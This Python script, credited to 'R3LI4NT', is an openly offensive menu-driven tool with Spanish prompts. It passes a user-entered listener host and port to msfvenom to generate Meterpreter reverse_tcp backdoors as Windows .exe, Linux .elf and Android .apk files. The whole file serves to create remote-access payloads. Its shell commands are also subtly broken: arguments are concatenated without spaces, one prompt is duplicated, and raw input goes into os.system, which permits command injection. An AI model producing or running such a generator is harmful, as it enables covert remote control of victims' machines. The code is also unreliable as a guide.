#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
from colorama import Fore, Style

os.system("clear")

def logo():
	print("""
\033[1;31m     _______               \033[0;m      \033[1;32m __                            __\033[0;m 
\033[1;31m    /       \              \033[0;m      \033[1;32m/  |                          /  |\033[0;m
\033[1;31m    $$$$$$$  | ______   __    __ \033[0;m\033[1;32m$$ |  ______    ______    ____$$ |\033[0;m
\033[1;31m    $$ |__$$ |/      \ /  |  /  |\033[0;m\033[1;32m$$ | /      \  /      \  /    $$ |\033[0;m
\033[1;31m    $$    $$/ $$$$$$  |$$ |  $$ |\033[0;m\033[1;32m$$$$ |/$$$$$$  | $$$$$$ |/$$$$$$$|\033[0;m
\033[1;31m    $$$$$$$/  /    $$ |$$ |  $$ |\033[0;m\033[1;32m$$ |$$ |  $$ | /    $$ |$$ |  $$ |\033[0;m
\033[1;31m    $$ |     /$$$$$$$ |$$ \__$$ |\033[0;m\033[1;32m$$ |$$ \__$$ |/$$$$$$$ |$$ \__$$ |\033[0;m
\033[1;31m    $$ |     $$    $$ |$$    $$ |\033[0;m\033[1;32m$$ |$$    $$/ $$    $$ |$$    $$ |\033[0;m
\033[1;31m    $$/       $$$$$$$/  $$$$$$$ |\033[0;m\033[1;32m$$/  $$$$$$/   $$$$$$$/  $$$$$$$/\033[0;m 
\033[1;31m                       /  \__$$ |\033[0;m                                  
\033[1;31m                       $$    $$/ \033[0;m                                  
\033[1;31m                        $$$$$$/  \033[0;m 

====================================
\033[0;33m By:\033[0;m \033[1;37mR3LI4NT\033[0;m
\033[0;33m Github:\033[0;m \033[1;37mhttps://github.com/R3LI4NT\033[0;m
====================================
""")
logo()


def windows(lhost,lport,name):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + "LPORT=" + lport + "-f exe > " + name + ".exe")


def linux(lhost,lport,name):
	os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + lhost + "LPORT=" + lport + "-f elf > " + name + ".elf")


def android(lhost,lport,name):
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + "LPORT=" + lport + "R > " + name + ".apk") 


def menu():
    print(Style.DIM + Fore.RED + "Selecciona una opción:" + Style.NORMAL + Fore.WHITE)
    print("\t\033[1;35m[1]\033[0;m Crear payload para \033[3;37mWindows\033[0;m")
    print("\t\033[1;35m[2]\033[0;m Crear payload para \033[3;37mLinux\033[0;m")
    print("\t\033[1;35m[3]\033[0;m Crear payload para \033[3;37mAndroid\033[0;m")

while True:
    menu()
    
    option = input(Style.BRIGHT + Fore.BLUE +">> "  + Style.NORMAL + Fore.WHITE)

    if option == "1":
        lhost = input("Introduza \033[1;36mLhost:\033[0;m ")
        lport = input("Introduza \033[1;36mLhost:\033[0;m ")
        name = input("Introduza el nombre: ")
        print(Style.BRIGHT + Fore.GREEN +"Generando payload..." + Style.NORMAL + Fore.WHITE)
        windows(lhost,lport,name)    

    elif option == "2":
        lhost = input("Introduza \033[1;36mLHOST:\033[0;m ")
        lport = input("Introduza \033[1;36mLPORT:\033[0;m ")
        name = input("Introduza el nombre: ")
        print(Style.BRIGHT + Fore.GREEN +"Generando payload..." + Style.NORMAL + Fore.WHITE)
        linux(lhost,lport,name)    

    elif option == "3":
        lhost = input("Introduza \033[1;36mLHOST:\033[0;m ")
        lport = input("Introduza \033[1;36mLPORT:\033[0;m ")
        name = input("Introduza el nombre: ")
        print(Style.BRIGHT + Fore.GREEN +"Generando payload..." + Style.NORMAL + Fore.WHITE)
        android(lhost,lport,name)  

    else:
        print("\033[1;31m\nError:\033[0;m Opción incorrecta, intente nuevamente.\n")    
